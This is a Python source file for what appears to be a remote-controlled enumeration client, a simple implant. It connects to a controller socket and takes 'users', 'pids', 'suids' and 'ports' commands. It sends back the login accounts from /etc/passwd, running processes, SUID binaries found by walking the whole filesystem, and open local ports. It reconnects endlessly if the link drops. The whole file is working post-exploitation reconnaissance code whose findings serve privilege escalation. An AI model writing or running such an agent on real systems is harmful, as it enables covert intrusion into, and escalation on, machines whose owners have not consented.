import socket
import psutil as ps
import platform
import os


class PyClient: # Initializing PyClient
    """
    A class representing a client for receiving commands and sending responses to a controller.

    Attributes:
        host (str): The IP address of the controller.
        port (int): The port number of the controller.
        connected (bool): A boolean indicating whether the client is connected to the controller.
        client: The client socket object for communication with the controller.
        users (str): A string containing information about system users.
    """

    def __init__(self): # Initializing class attributes
        """
        Initializes the PyClient class attributes.
        """
        self.host = "127.0.0.1"
        self.port = 12345
        self.connected = False
        self.client = None
        self.users = "\n"

    def commands(self): # Initializing commands methods
        """
        Receives commands from the controller and sends responses.
        """
        OS = platform.system() # Finding OS platform
        self.client.send(OS.encode("ascii")) # Sending the OS platform to controller

        if OS == "Linux": # Checking if the OS type is linux
            while True:
                data = ""
                data = self.client.recv(1024) # Receiving enumeration method
                data = str(data.decode("ascii")) # Decoding enumeration method

                if not data:
                    self.connection() # Re-Connecting if not connected

                elif data == "users": # Checking if "users" enum method has been chosen
                    self.linUsers() # Starting linUsers class method
                    self.client.send(("Users Enum\n" + self.users + "\n").encode("ascii")) # Sending linUsers results back to controller
                    self.users = "\n"

                elif data == "pids": # Checking if "pids" enum method has been chosen
                    processes = self.linPids() # Storing results of linPids class method
                    self.client.send(("PIDs Enum\n" + processes + "\n").encode("ascii")) # Sending linPids results back to controller

                elif data == "suids": # Checking if "suids" enum method has been chosen
                    suids = self.linSUID() # Storing results of linSUID class method
                    self.client.send(("SUID Enum\n" + suids).encode("ascii")) # Sending linSUID results back to controller

                else:
                    data += "\ninvalid command"
                    self.client.send(data.encode("ascii"))

        else:
            while True:
                data = ""
                data = self.client.recv(1024) # Receiving enumeration method
                data = str(data.decode("ascii")) # Decoding enumeration method

                if not data:
                    self.connection() # Re-Connecting if not connected

                elif data == "users": # Checking if "users" enum method has been chosen
                    data = self.winUsers() # Storing results of winUsers class method
                    self.client.send(data.encode("ascii")) # Sending results of winUsers back to controller

                elif data == "pids": # Checking if "pids" enum method has been chosen
                    processes = self.linPids() # Storing results of linPids class method
                    self.client.send(processes.encode("ascii")) # Sending linPids results back to controller

                elif data == "ports": # Checking if "ports" enum method has been chosen
                    ports = self.winScanner() # Storing results of winScanner class method
                    self.client.send(ports.encode("ascii")) # Sending winScanner results back to controller

                else:
                    data += "\ninvalid command"
                    self.client.send(data.encode("ascii"))

    def connection(self): # Initializing connection method
        """
        Establishes a connection to the controller server.
        """
        try:
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Initializing client
            self.client.connect((self.host, self.port)) # Attempting connection to controller
            self.commands() # Starting commands class method
        except Exception:
            self.connection() # If unable to connect try again

    def linUsers(self): # Initializing linUsers class method
        """
        Retrieves information about Linux system users.

        Reads the '/etc/passwd' file to extract information about system users.
        """
        f = open("/etc/passwd", "r") # Storing the passwd file

        for line in f: # Reading the file line for line
            if not ("nologin" in line): # Removing lines that contain "nologin"
                self.users += ("| " + line[:line.find(":")] + "\n") # Adding results to variable

        f.close()

    def linPids(self): # Initializing linPids class method
        """
        Retrieves information about running processes on the Linux system using the psutil library.
        """
        prIDs = ps.pids() # Storing process IDs into var
        pids = ""

        for pid in prIDs: # Checking each process ID in the list
            try:
                procs = str(ps.Process(pid)) # Creating a string out of the Process ID
                pids += ("| " + procs[procs.find("name=") + 6:procs.find("status") - 3] + "\n") # Formatting the results and storing them
            except Exception:
                break

        return pids # Returning results

    def winUsers(self): # Initializing winUsers class method
        """
        Retrieves information about system users from the 'C://Users//' directory.
        """
        Users = os.listdir("C://Users//") # Reading contents of Users directory

        UsersNotRequired = {"All Users", "desktop.ini", "Default User", "Default"} # Initializing list of non-special users
        Users = set(Users) - set(UsersNotRequired) # Removing non-special users

        listUsers = ""

        for User in Users: # Retrieving individual user
            listUsers += ("| " + User + "\n") # Formatting the results

        return listUsers # Returning results

    def linSUID(self): # Initializing SUID binary Search
        """
        Traverses the file system to search for SUID binaries on the Linux system.
        """
        suids = ""

        for root, dirs, files in os.walk("/"): # Walking each file path
            for file in files: # For each file in files found
                filepath = os.path.join(root, file)

                try:
                    mode = os.stat(filepath).st_mode # Checking file permissions

                    if (mode & 0o4000) and (mode & 0o111): # Checking SUID and execute permissions
                        suids += ("\n" + "| " + filepath) # Formatting the results

                except Exception:
                    continue

        return suids # Returning results

    def portChecker(self, port): # Initializing portChecker class method
        """
        Checks if a specified port is open on the localhost.

        Args:
            port (int): The port number to check.

        Returns:
            bool: True if the port is open, False otherwise.
        """
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: # Creating a socket
            s.settimeout(0.001) # Setting appropriate timeout
            return s.connect_ex(("localhost", port)) == 0 # Returning all results equal to 0

    def winScanner(self): # Initializing winScanner class method
        """
        Scans for open ports in the range 0-1024 on the localhost.
        """
        ports = ""

        for i in range(1024): # Checking all ports in the range 0-1024
            if self.portChecker(i):
                ports += ("| " + str(i)) # Formatting the results

        return ports # Returning results


if __name__ == "__main__":
    NewClient = PyClient()
    NewClient.connection()
